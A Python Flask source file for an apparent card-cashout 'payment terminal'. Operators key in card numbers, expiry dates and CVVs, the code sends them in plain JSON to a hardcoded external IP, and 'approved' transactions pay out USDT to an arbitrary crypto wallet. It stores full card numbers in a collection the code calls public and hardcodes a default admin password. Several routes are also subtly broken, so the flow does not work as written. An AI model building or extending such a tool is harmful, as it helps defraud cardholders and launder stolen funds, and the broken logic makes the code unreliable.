  # app.py
# This is the main Flask application for the BlackRock Payment Terminal.
# It handles user authentication, transaction flow, direct communication with an external
# ISO 8583 server for card authorization via TCP sockets, and real-time cryptocurrency payouts.
# Now with Firestore integration for persistent transaction history.

import os
import json # For parsing Firebase config
import hashlib
import logging
import random
import re
import struct # For packing/unpacking binary data for ISO 8583
import socket # For direct TCP socket communication with ISO 8583 server
from datetime import datetime, date, timedelta
from functools import wraps

from flask import Flask, render_template, request, redirect, session, url_for, flash, jsonify
from werkzeug.security import generate_password_hash, check_password_hash

# Firebase Admin SDK for server-side interaction with Firestore
import firebase_admin
from firebase_admin import credentials, firestore, auth

# Import custom modules
from blockchain_client import BlockchainClient
from utils import validate_card_number, format_amount, generate_transaction_id
from security_middleware import SecurityMiddleware, audit_log, require_role
from production_config import get_production_config, validate_production_config
from config import get_wallet_config # For merchant wallet addresses

# Configure logging for the application
logging.basicConfig(level=logging.INFO) # Set to INFO for production, DEBUG for development
logger = logging.getLogger(__name__)

app = Flask(__name__)
# IMPORTANT: In a real production environment, app.secret_key MUST be a long,
# randomly generated string stored securely (e.g., in an environment variable).
# The default here is for development/demonstration purposes only.
app.secret_key = os.environ.get("SESSION_SECRET", "blackrock_terminal_secret_2025_DEFAULT_DO_NOT_USE_IN_PROD")
app.permanent_session_lifetime = timedelta(hours=8) # Sessions last for 8 hours

# Initialize the BlockchainClient for crypto payouts
blockchain_client = BlockchainClient()

# Initialize production security middleware
security_middleware = SecurityMiddleware(app)
production_config = get_production_config()

# Validate production configuration on startup
if not validate_production_config():
    logger.error("Production configuration validation failed. Please review production_config.py.")
    # In a strict production environment, this might prevent the app from starting.

# User roles for access control
ROLES = {
    'ADMIN': 'admin',
    'OPERATOR': 'operator'
}

# Default admin credentials (for initial setup/demo)
# In a real system, these would be managed securely, e.g., in a database.
DEFAULT_ADMIN = {
    'username': 'blackrockadmin',
    'password_hash': generate_password_hash('Br_3339'), # Default password set back to Br_3339
    'role': ROLES['ADMIN']
}

def init_default_users():
    """
    Initializes default users (like the admin) if the user data file does not exist.
    In a production environment, user management would typically involve a database.
    """
    users_file = 'config/users.json'
    if not os.path.exists(users_file):
        os.makedirs('config', exist_ok=True) # Ensure the config directory exists
        with open(users_file, 'w') as f:
            json.dump({
                'blackrockadmin': DEFAULT_ADMIN
            }, f, indent=2)
        logger.info("Default admin user initialized.")

def get_users():
    """Retrieves user data from the users.json file."""
    users_file = 'config/users.json'
    if os.path.exists(users_file):
        with open(users_file, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    """Saves updated user data back to the users.json file."""
    users_file = 'config/users.json'
    with open(users_file, 'w') as f:
        json.dump(users, f, indent=2)

def login_required(role=None):
    """
    Decorator to enforce login and role-based access control for routes.
    Redirects to login if not authenticated, or to dashboard if insufficient permissions.
    """
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not session.get('logged_in'):
                flash('Please log in to access this page.', 'error')
                return redirect(url_for('login'))
            
            if role and session.get('user_role') != role:
                flash('Insufficient permissions.', 'error')
                return redirect(url_for('dashboard')) # Redirect to a safe page like dashboard
            
            return f(*args, **kwargs)
        return decorated_function
    return decorator

def initialize_app_components():
    """Initializes necessary application components on startup."""
    init_default_users()

# Ensure session permanence before each request
@app.before_request
def make_session_permanent():
    session.permanent = True

@app.route('/', endpoint='index') # Explicitly named endpoint
def index():
    """Root URL redirects to login or dashboard based on session status."""
    if session.get('logged_in'):
        return render_template('index.html') # Render main terminal UI
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'], endpoint='login') # Explicitly named endpoint
@audit_log("User Login Attempt") # Audit log decorator for login attempts
def login():
    """Handles user login authentication."""
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        
        users = get_users()
        user = users.get(username)
        
        if user and check_password_hash(user['password_hash'], password):
            session['logged_in'] = True
            session['username'] = username
            session['user_role'] = user['role']
            session['login_time'] = datetime.now().isoformat()
            
            logger.info(f"User {username} logged in with role {user['role']}")
            flash(f'Welcome, {username}!', 'success')
            return redirect(url_for('index')) # Redirect to index (main terminal) after login
        else:
            flash('Invalid username or password.', 'error')
            logger.warning(f"Failed login attempt for username: {username}")
    
    return render_template('login.html')

@app.route('/logout', endpoint='logout') # Explicitly named endpoint
def logout():
    """Handles user logout, clearing the session."""
    username = session.get('username', 'Unknown')
    session.clear()
    flash(f'Goodbye, {username}!', 'info')
    logger.info(f"User {username} logged out")
    return redirect(url_for('login'))

@app.route('/dashboard', endpoint='dashboard') # Explicitly named endpoint
@login_required()
def dashboard():
    """Displays the main dashboard. Admin users see admin options."""
    user_role = session.get('user_role')
    
    if user_role == ROLES['ADMIN']:
        return render_template('admin_dashboard.html', 
                             username=session.get('username'))
    else:
        return redirect(url_for('index')) # Operators go directly to main terminal

@app.route('/admin/config', methods=['GET', 'POST'], endpoint='admin_config') # Explicitly named endpoint
@login_required(role=ROLES['ADMIN'])
def admin_config():
    """
    Admin configuration management for payout wallets and transaction limits.
    This uses environment variables or default values now.
    """
    # Load current values from environment variables or defaults
    current_erc20_wallet = os.environ.get('DEFAULT_ERC20_WALLET', '0xDefaultERC20WalletAddressForTesting')
    current_trc20_wallet = os.environ.get('DEFAULT_TRC20_WALLET', 'TDefaultTRC20WalletAddressForTesting')
    current_daily_limit = int(os.environ.get('DAILY_LIMIT_PER_TERMINAL', '10000000')) # Default 10M

    if request.method == 'POST':
        try:
            # Update wallet addresses (these would update environment variables or a database in a real system)
            erc20_wallet = request.form.get('erc20_wallet', '').strip()
            trc20_wallet = request.form.get('trc20_wallet', '').strip()
            daily_limit_str = request.form.get('daily_limit', '10000000')
            
            # Validate wallet addresses
            if erc20_wallet and not (erc20_wallet.startswith('0x') and len(erc20_wallet) == 42):
                flash('Invalid ERC-20 wallet address format.', 'error')
                return redirect(url_for('admin_config'))
            
            if trc20_wallet and not (trc20_wallet.startswith('T') and len(trc20_wallet) >= 34):
                flash('Invalid TRC-20 wallet address format.', 'error')
                return redirect(url_for('admin_config'))
            
            daily_limit = int(daily_limit_str)
            if daily_limit <= 0:
                flash('Daily limit must be a positive number.', 'error')
                return redirect(url_for('admin_config'))

            logger.info(f"Admin {session.get('username')} updated ERC20 wallet to: {erc20_wallet}")
            logger.info(f"Admin {session.get('username')} updated TRC20 wallet to: {trc20_wallet}")
            logger.info(f"Admin {session.get('username')} updated Daily Limit to: {daily_limit}")

            current_erc20_wallet = erc20_wallet
            current_trc20_wallet = trc20_wallet
            current_daily_limit = daily_limit
            
            flash('Configuration updated successfully! (Note: Changes might require re-deployment for persistence)', 'success')
            
        except ValueError:
            flash('Invalid input for daily limit. Please enter a number.', 'error')
        except Exception as e:
            logger.error(f"Configuration update failed: {str(e)}")
            flash('Configuration update failed. Please check your inputs.', 'error')
    
    return render_template('admin_config.html', 
                           erc20_wallet=current_erc20_wallet,
                           trc20_wallet=current_trc20_wallet,
                           daily_limit=current_daily_limit)

@app.route('/protocol', methods=['GET', 'POST'], endpoint='protocol') # Explicitly named endpoint
@login_required()
def protocol():
    """Allows selection of the payment protocol."""
    PROTOCOLS = {
        "POS Terminal -101.1 (4-digit approval)": 4,
        "POS Terminal -101.4 (6-digit approval)": 6,
        "POS Terminal -101.6 (Pre-authorization)": 6,
        "POS Terminal -101.7 (4-digit approval)": 4,
        "POS Terminal -101.8 (PIN-LESS transaction)": 4,
        "POS Terminal -201.1 (6-digit approval)": 6,
        "POS Terminal -201.3 (6-digit approval)": 6,
        "POS Terminal -201.5 (6-digit approval)": 6
    }
    if request.method == 'POST':
        protocol = request.form.get('protocol')
        if protocol:
            session['protocol'] = protocol
            session['transaction_start'] = datetime.now().isoformat()
            session['code_length'] = PROTOCOLS.get(protocol, 6) 
            logger.info(f"Protocol selected: {protocol}")
            return redirect(url_for('amount'))
        else:
            flash('Please select a protocol.', 'error')
    
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'], endpoint='amount') # Explicitly named endpoint
@login_required()
def amount():
    """Allows input of the transaction amount and currency."""
    DAILY_LIMIT_PER_TERMINAL = int(os.environ.get('DAILY_LIMIT_PER_TERMINAL', '10000000')) # Default 10M

    if request.method == 'POST':
        amount_str = request.form.get('amount', '').replace(',', '').strip()
        currency = request.form.get('currency')

        if not currency or currency not in ['USD', 'EUR']:
            flash("Please select a valid currency.", "error")
            return render_template('amount.html')
        
        try:
            amount_float = float(amount_str)
            if amount_float <= 0:
                flash("Amount must be a positive number.", "error")
                return render_template('amount.html')

            current_date = date.today()
            last_txn_date_str = session.get('last_transaction_date')

            if last_txn_date_str and date.fromisoformat(last_txn_date_str) < current_date:
                session['daily_amount_spent'] = 0.0
                session['last_transaction_date'] = current_date.isoformat()

            current_spent = session.get('daily_amount_spent', 0.0)
            if (current_spent + amount_float) > DAILY_LIMIT_PER_TERMINAL:
                flash(f"Daily transaction limit of {DAILY_LIMIT_PER_TERMINAL:,.2f} {currency} exceeded for this terminal.", "error")
                return render_template('amount.html')

            session['amount'] = amount_str
            session['currency'] = currency
            session['daily_amount_spent'] = current_spent + amount_float

            logger.info(f"Amount set: {amount_str} {currency}")
            return redirect(url_for('payout'))
            
        except ValueError:
            flash('Please enter a valid amount.', 'error')
    
    default_amount = os.environ.get('DEFAULT_TRANSACTION_AMOUNT', '1000000') # Default 1M
    return render_template('amount.html', default_amount=default_amount)

@app.route('/payout', methods=['GET', 'POST'], endpoint='payout') # Explicitly named endpoint
@login_required()
def payout():
    """Allows selection of the crypto payout method and wallet."""
    default_erc20_wallet = os.environ.get('DEFAULT_ERC20_WALLET', '0xDefaultERC20WalletAddressForTesting')
    default_trc20_wallet = os.environ.get('DEFAULT_TRC20_WALLET', 'TDefaultTRC20WalletAddressForTesting')

    if request.method == 'POST':
        method = request.form['method']
        custom_wallet = request.form.get('custom_wallet', '').strip()

        if method == 'ERC20':
            wallet = custom_wallet if custom_wallet else default_erc20_wallet
            if custom_wallet and not (wallet.startswith('0x') and len(wallet) == 42):
                flash('Invalid ERC-20 wallet address format.', 'error')
                return redirect(url_for('payout'))
            session['payout_type'] = 'ERC20'
            session['wallet'] = wallet
            
        elif method == 'TRC20':
            wallet = custom_wallet if custom_wallet else default_trc20_wallet
            if custom_wallet and not (wallet.startswith('T') and len(wallet) >= 34):
                flash('Invalid TRC-20 wallet address format.', 'error')
                return redirect(url_for('payout'))
            session['payout_type'] = 'TRC20'
            session['wallet'] = wallet
        
        else:
            flash('Please select a payout method.', 'error')
            return redirect(url_for('payout'))
        
        logger.info(f"Payout method selected: {method}, Wallet: {session['wallet'][:10]}...")
        return redirect(url_for('card'))
    
    return render_template('payout.html',
                           default_erc20_wallet=default_erc20_wallet,
                           default_trc20_wallet=default_trc20_wallet)

@app.route('/card', methods=['GET', 'POST'], endpoint='card') # Explicitly named endpoint
@login_required()
def card():
    """Allows input of card details."""
    if request.method == 'POST':
        pan = request.form['pan'].replace(" ", "").replace("-", "")
        exp = request.form['expiry'].replace("/", "")
        cvv = request.form['cvv']
        
        if not validate_card_number(pan):
            flash('Invalid card number format.', 'error')
            return redirect(url_for('card'))
        
        if not re.match(r'^\d{4}$', exp):
            flash('Invalid expiry date format (MMYY).', 'error')
            return redirect(url_for('card'))
        
        if not re.match(r'^\d{3,4}$', cvv):
            flash('Invalid CVV format.', 'error')
            return redirect(url_for('card'))

        session.update({'pan': pan, 'exp': exp, 'cvv': cvv})

        if pan.startswith("4"):
            session['card_type'] = "VISA"
        elif pan.startswith("5"):
            session['card_type'] = "MASTERCARD"
        elif pan.startswith("3"):
            session['card_type'] = "AMEX"
        elif pan.startswith("6"):
            session['card_type'] = "DISCOVER"
        else:
            session['card_type'] = "UNKNOWN"
        
        logger.info(f"Card entered: {session['card_type']} ending in {pan[-4:]}")
        return redirect(url_for('auth'))
    
    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'], endpoint='auth') # Explicitly named endpoint
@login_required()
def auth():
    """Allows input of the authorization code and triggers the transaction process."""
    expected_length = session.get('code_length', 6) 
    
    if request.method == 'POST':
        code = request.form.get('auth')
        if len(code) != expected_length or not code.isdigit():
            flash(f"Authorization code must be {expected_length} digits and numeric.", "error")
            return render_template('auth.html', code_length=expected_length, warning=f"Code must be {expected_length} digits and numeric.")

        session['auth_code'] = code

        # Prepare data for ISO 8583 message (as a dictionary)
        iso_request_data = {
            'mti': '0100',  # Authorization Request
            'pan': session.get('pan'),
            'amount': int(float(session.get('amount')) * 100), # Amount in cents/smallest unit
            'expiry': session.get('exp'),
            'cvv': session.get('cvv'),
            'auth_code': session.get('auth_code'),
            'transaction_id': generate_transaction_id(), # Generate a new ID for the ISO message
            'currency_code': '840' if session.get('currency') == 'USD' else '978', # ISO 4217 for USD/EUR
            'protocol_type': session.get('protocol')
        }

        # Get ISO server details from environment variables
        ISO_SERVER_HOST = os.environ.get('ISO_SERVER_HOST', '66.185.176.0')
        ISO_SERVER_PORT = int(os.environ.get('ISO_SERVER_PORT', 20))
        ISO_TIMEOUT = int(os.environ.get('ISO_TIMEOUT', 60)) # Timeout for socket connection

        logger.info(f"Attempting direct ISO 8583 connection to {ISO_SERVER_HOST}:{ISO_SERVER_PORT}...")
        iso_response = {}
        try:
            # Create a socket connection
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(ISO_TIMEOUT)
                sock.connect((ISO_SERVER_HOST, ISO_SERVER_PORT))
                logger.info("Connected to ISO 8583 server.")

                # --- Build ISO 8583 Message (Simplified for demonstration) ---
                # This assumes the server at 66.185.176.0:20 understands a JSON payload
                # wrapped with a 2-byte length header.
                # If the server expects raw ISO 8583 binary, this part needs a full ISO 8583 library.

                # Convert dict to JSON string, then encode to bytes
                json_payload = json.dumps(iso_request_data)
                message_body = json_payload.encode('utf-8')
                
                # Prepend with 2-byte length header (big-endian short)
                message_length = len(message_body)
                length_header = struct.pack('!H', message_length) # !H means network byte order (big-endian) unsigned short

                full_message = length_header + message_body
                
                logger.info(f"Sending {len(full_message)} bytes to ISO server (payload length: {message_length})...")
                sock.sendall(full_message)

                # --- Receive ISO 8583 Response ---
                # First, read the 2-byte length header of the response
                response_length_header = sock.recv(2)
                if not response_length_header:
                    raise ConnectionError("Did not receive length header from ISO server.")
                response_length = struct.unpack('!H', response_length_header)[0]
                
                # Read the actual response body based on the length
                response_body = sock.recv(response_length)
                if not response_body:
                    raise ConnectionError("Did not receive response body from ISO server.")

                # Assuming the response is also JSON wrapped in a length header
                iso_response_json = response_body.decode('utf-8')
                iso_response = json.loads(iso_response_json)
                logger.info(f"Received response from ISO 8583 server: {iso_response}")

        except socket.timeout:
            logger.error(f"ISO 8583 server connection timed out after {ISO_TIMEOUT} seconds.")
            iso_response = {'status': 'ERROR', 'message': 'ISO Server Timeout', 'field39': '99'}
        except ConnectionRefusedError:
            logger.error(f"Connection to ISO 8583 server refused at {ISO_SERVER_HOST}:{ISO_SERVER_PORT}.")
            iso_response = {'status': 'ERROR', 'message': 'Connection Refused', 'field39': '99'}
        except socket.error as e:
            logger.error(f"Socket error during ISO 8583 communication: {e}")
            iso_response = {'status': 'ERROR', 'message': f'Socket Error: {e}', 'field39': '99'}
        except json.JSONDecodeError:
            logger.error(f"Invalid JSON response from ISO 8583 server: {iso_response_json}")
            iso_response = {'status': 'ERROR', 'message': 'Invalid Server Response Format', 'field39': '99'}
        except Exception as e:
            logger.critical(f"Critical error during ISO 8583 communication: {e}", exc_info=True)
            iso_response = {'status': 'ERROR', 'message': f'Unexpected ISO Communication Error: {e}', 'field39': '99'}

        status = iso_response.get('status', 'Declined')
        auth_code = iso_response.get('auth_code')
        message = iso_response.get('message', 'Unknown error.')
        field39_resp = iso_response.get('field39', 'XX') # ISO 8583 Field 39 Response Code

        current_transaction_details = {
            'transaction_id': iso_request_data['transaction_id'], # Use the ID generated for the ISO message
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'card_number': session.get('pan'),
            'amount': float(session.get('amount')),
            'currency': session.get('currency'),
            'protocol_type': session.get('protocol'),
            'crypto_network_type': session.get('payout_type'),
            'status': status,
            'auth_code_required': False,
            'payout_status': None,
            'crypto_payout_amount': 0.0,
            'simulated_gas_fee': 0.0,
            'crypto_address': '',
            'iso_field39': field39_resp,
            'message': message # Store the message from ISO server
        }

        # Store transaction in Firestore for persistence
        if db: # Only attempt Firestore operations if db client is initialized
            try:
                get_transactions_collection_ref().document(current_transaction_details['transaction_id']).set(current_transaction_details)
                logger.info(f"Firestore: Stored initial transaction {current_transaction_details['transaction_id']}")
            except Exception as e:
                logger.error(f"Firestore Error: Could not store initial transaction {current_transaction_details['transaction_id']}: {e}")
                flash("Failed to log transaction to history.", "warning")
        else:
            logger.warning("Firestore not initialized. Transaction logging skipped.")


        if status == 'Approved' and auth_code:
            session['message'] = f'Payment authorized. Please enter the APP/AUTH Code.'
            session['message_type'] = 'info'
            return redirect(url_for('auth_code_entry_screen', transaction_id=current_transaction_details['transaction_id']))
        else:
            session['message'] = f'Payment {status}: {message}'
            session['message_type'] = 'error'
            return redirect(url_for('reject_screen', transaction_id=current_transaction_details['transaction_id']))

    return render_template('auth.html', code_length=expected_length)

# --- Helper function for retrieving transaction details from Firestore ---
def get_transaction_details_from_firestore(transaction_id):
    """Retrieves transaction details from Firestore."""
    if db:
        try:
            doc_ref = get_transactions_collection_ref().document(transaction_id)
            doc = doc_ref.get()
            if doc.exists:
                return doc.to_dict()
        except Exception as e:
            logger.error(f"Firestore Error: Could not retrieve transaction {transaction_id}: {e}")
    return None

@app.route('/auth_code_entry/<transaction_id>', endpoint='auth_code_entry_screen') # Explicitly named endpoint
@login_required
def auth_code_entry_screen(transaction_id):
    """Renders the dedicated authorization code entry screen."""
    transaction = get_transaction_details_from_firestore(transaction_id)
    if not transaction or not transaction.get('auth_code_required'):
        flash('Invalid or expired transaction for auth code entry.', 'error')
        return redirect(url_for('index'))
    
    return render_template('auth_code_entry.html', transaction_id=transaction_id)


@app.route('/complete_payment', methods=['POST'], endpoint='complete_payment') # Explicitly named endpoint
@login_required
def complete_payment():
    """
    Handles the completion of payment after manual APP/AUTH code entry.
    Triggers the crypto payout.
    """
    transaction_id = request.form['transaction_id']
    entered_auth_code = request.form['auth_code']

    transaction_details = get_transaction_details_from_firestore(transaction_id)
    if not transaction_details:
        flash('Invalid or expired transaction ID.', 'error')
        return redirect(url_for('index'))

    # In a real scenario, you'd send this entered_auth_code back to the ISO server
    # for final verification. For this simulation, we compare it with the auth_code
    # received in the initial ISO response and stored in transaction_details.
    mock_expected_auth_code = transaction_details.get('auth_code') # This was stored from initial ISO response

    if entered_auth_code == mock_expected_auth_code:
        # Authorization successful, proceed with crypto payout
        recipient_wallet_info = get_wallet_config(transaction_details['crypto_network_type'])
        recipient_crypto_address = recipient_wallet_info['address']

        crypto_payout_result = blockchain_client.send_usdt( # Use blockchain_client for real payouts
            network=transaction_details['crypto_network_type'].lower(),
            to_address=recipient_crypto_address,
            amount_usd=transaction_details['amount']
        )

        transaction_details['crypto_payout_amount'] = crypto_payout_result.get('payout_amount_usdt', 0.0)
        transaction_details['simulated_gas_fee'] = crypto_payout_result.get('simulated_gas_fee_usdt', 0.0)
        transaction_details['payout_status'] = crypto_payout_result.get('status')
        transaction_details['status'] = 'Completed' # Overall transaction status
        transaction_details['auth_code_required'] = False # No longer required
        transaction_details['crypto_address'] = recipient_crypto_address # Store for display
        transaction_details['blockchain_hash'] = crypto_payout_result.get('transaction_hash', 'N/A') # Store real hash
        transaction_details['message'] = crypto_payout_result.get('message', 'Payment and Crypto Payout Completed.')

        # Update transaction in Firestore
        if db:
            try:
                get_transactions_collection_ref().document(transaction_id).set(transaction_details)
                logger.info(f"Firestore: Updated completed transaction {transaction_id}")
            except Exception as e:
                logger.error(f"Firestore Error: Could not update completed transaction {transaction_id}: {e}")
                flash("Failed to update transaction history.", "warning")
        
        if crypto_payout_result.get('status') == 'Success':
            flash("Payment Approved and Payout Initiated!", "success")
            return redirect(url_for('success_screen', transaction_id=transaction_id))
        else:
            flash(f"Payment Completed, but Payout Failed: {transaction_details['message']}", "warning")
            return redirect(url_for('reject_screen', transaction_id=transaction_id))

    else:
        transaction_details['status'] = 'Declined (Auth Code Mismatch)'
        transaction_details['message'] = 'Invalid APP/AUTH Code. Payment failed.'
        
        # Update transaction in Firestore as declined
        if db:
            try:
                get_transactions_collection_ref().document(transaction_id).set(transaction_details)
                logger.info(f"Firestore: Updated declined transaction {transaction_id}")
            except Exception as e:
                logger.error(f"Firestore Error: Could not update declined transaction {transaction_id}: {e}")
                flash("Failed to update transaction history.", "warning")

        flash('Invalid APP/AUTH Code. Payment failed.', 'error')
        return redirect(url_for('reject_screen', transaction_id=transaction_id))


@app.route('/success', endpoint='success_screen') # Explicitly named endpoint
@login_required
def success_screen():
    """Renders the success screen with transaction details."""
    transaction_id = request.args.get('transaction_id')
    transaction = get_transaction_details_from_firestore(transaction_id)

    if not transaction:
        flash('Transaction details not found.', 'error')
        return redirect(url_for('index'))

    return render_template('success.html', transaction=transaction)

@app.route('/reject', endpoint='reject_screen') # Explicitly named endpoint
@login_required
def reject_screen():
    """Renders the reject screen with transaction details."""
    transaction_id = request.args.get('transaction_id')
    transaction = get_transaction_details_from_firestore(transaction_id)

    if not transaction:
        flash('Transaction details not found.', 'error')
        return redirect(url_for('index'))

    return render_template('reject.html', transaction=transaction)

@app.route('/transaction_history', endpoint='transaction_history_screen') # Explicitly named endpoint
@login_required
def transaction_history_screen():
    """Renders the transaction history screen."""
    transactions = []
    if db:
        try:
            # Fetch all documents from the transactions collection, ordered by timestamp
            docs = get_transactions_collection_ref().order_by('timestamp', direction=firestore.Query.DESCENDING).limit(100).stream()
            for doc in docs:
                txn = doc.to_dict()
                # Convert Firestore Timestamp object to a readable string for display
                if 'timestamp' in txn and isinstance(txn['timestamp'], datetime): # Check if it's a datetime object
                    txn['timestamp'] = txn['timestamp'].strftime('%Y-%m-%d %H:%M:%S')
                transactions.append(txn)
            logger.info(f"Firestore: Fetched {len(transactions)} transactions for history.")
        except Exception as e:
            logger.error(f"Firestore Error: Could not fetch transaction history: {e}")
            flash('Error loading transaction history.', 'error')
    else:
        flash('Firestore not initialized. Transaction history not available.', 'warning')

    return render_template('transaction_history.html', transactions=transactions)


# --- Firebase Initialization (for Canvas environment) ---
# Global variables provided by the Canvas environment
app_id = os.environ.get('__app_id', 'default-app-id')
firebase_config_str = os.environ.get('__firebase_config', '{}')
initial_auth_token = os.environ.get('__initial_auth_token', None)

db = None # Firestore client
current_user_id = None # Authenticated user ID

# Initialize Firebase Admin SDK and Firestore client
# This block runs when the module is loaded.
if firebase_config_str:
    try:
        firebase_config = json.loads(firebase_config_str)
        if not firebase_admin._apps: # Prevent re-initialization
            firebase_admin.initialize_app(options={'projectId': firebase_config.get('projectId')})
        db = firestore.client()
        logger.info("Firebase Admin SDK initialized successfully.")

        # Authenticate with custom token if provided (Canvas environment)
        if initial_auth_token:
            try:
                decoded_token = auth.verify_id_token(initial_auth_token)
                current_user_id = decoded_token['uid']
                logger.info(f"Signed in with custom token. User ID: {current_user_id}")
            except Exception as e:
                logger.error(f"Error verifying initial auth token: {e}. Signing in anonymously for Firestore.")
                current_user_id = f"anonymous_{os.urandom(16).hex()}" # Fallback anonymous ID
        else:
            current_user_id = f"anonymous_{os.urandom(16).hex()}" # Anonymous ID for local dev
            logger.info(f"No initial auth token. Signed in anonymously. User ID: {current_user_id}")

    except Exception as e:
        logger.error(f"Error initializing Firebase Admin SDK: {e}. Firestore will not be available.")
        db = None # Ensure db is None if initialization fails
        current_user_id = None # Ensure user ID is None if initialization fails
else:
    logger.warning("Firebase config not found in environment variables. Firestore will not be available.")
    db = None
    current_user_id = None

# --- Firestore Helpers (defined after Firebase init) ---
def get_transactions_collection_ref():
    """Returns the Firestore collection reference for transactions."""
    if db and current_user_id:
        # Using a public collection path for simplicity in this demo, tied to app_id
        # For private user data, use: return db.collection(f"artifacts/{app_id}/users/{current_user_id}/transactions")
        return db.collection(f"artifacts/{app_id}/public/data/transactions")
    else:
        logger.error("Firestore DB or current_user_id not initialized. Cannot get collection reference.")
        # Return a dummy object to prevent runtime errors if Firestore is not available
        class DummyCollectionRef:
            def document(self, doc_id): return self
            def set(self, data): pass
            def get(self): return type('obj', (object,), {'exists': False, 'to_dict': lambda: {}})()
            def stream(self): return []
            def order_by(self, *args, **kwargs): return self
            def limit(self, *args, **kwargs): return self
            def add(self, data): pass # Add add method for compatibility
        return DummyCollectionRef()


# Initialize the application components when the module is loaded
initialize_app_components()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
